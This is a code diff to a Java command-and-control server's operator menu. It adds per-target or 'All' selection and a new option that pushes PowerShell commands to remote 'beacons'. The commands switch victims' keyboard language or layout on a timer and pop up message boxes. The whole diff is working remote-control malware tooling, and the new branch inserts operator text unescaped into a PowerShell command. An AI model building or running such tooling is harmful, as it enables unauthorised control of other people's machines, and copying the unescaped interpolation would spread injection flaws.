@@ -313,13 +313,16 @@ public class C2ServerUserHandler implements Runnable{
                 System.out.println("1. THE GOOSE");
                 System.out.println("2. Change Keyboard Language [EASY]");
                 System.out.println("3. Change Keybaord Layout [HARD]");
-                System.out.println("4. Back");
+                System.out.println("4. Send Message Box");
+                System.out.println("5. Back");
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
                 userInput = userInputScanner.nextLine();
                 if(userInput.equals("1")){
                     // TODO: Figure out how to launch the goose.
                 } else if (userInput.equals("2")){
+                    System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
+                    String target = userInputScanner.nextLine();
                     // Set their Keybaord language to French for 60 seconds, then change it back to English
                     String commands = "";
                     commands += "Set-WinUserLanguageList fr-FR;";
@@ -328,8 +331,10 @@ public class C2ServerUserHandler implements Runnable{
                     commands += "Start-Sleep -Seconds 60;";
                     commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                     commands += "Set-WinUserLanguageList en-US;";
-                    C2server.broadcastToBeacons(commands);
+                    C2server.broadcastToBeacons(" Windows " + target + " " + commands);
                 } else if (userInput.equals("3")){
+                    System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
+                    String target = userInputScanner.nextLine();
                     // Change their Keybaord language every 30 seconds
                     HashMap<String, String> languages = new HashMap<>();
                     String commands = "";
@@ -346,8 +351,16 @@ public class C2ServerUserHandler implements Runnable{
                     }
                     commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                     commands += "Set-WinUserLanguageList en-US;";
-                    C2server.broadcastToBeacons(commands);
+                    C2server.broadcastToBeacons(" Windows " + target + " " + commands);
                 } else if (userInput.equals("4")){
+                    // Send a message box
+                    String commands = "";
+                    commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                    System.out.println("Enter A Message to Display: ");
+                    String message = userInputScanner.nextLine();
+                    commands += "[System.Windows.MessageBox]::Show('"+ message+ "');";
+                    C2server.broadcastToBeacons(commands);
+                }else if (userInput.equals("5")){
                     currentUserPath = "";
                 } else {
                     System.out.println("Invalid Input");
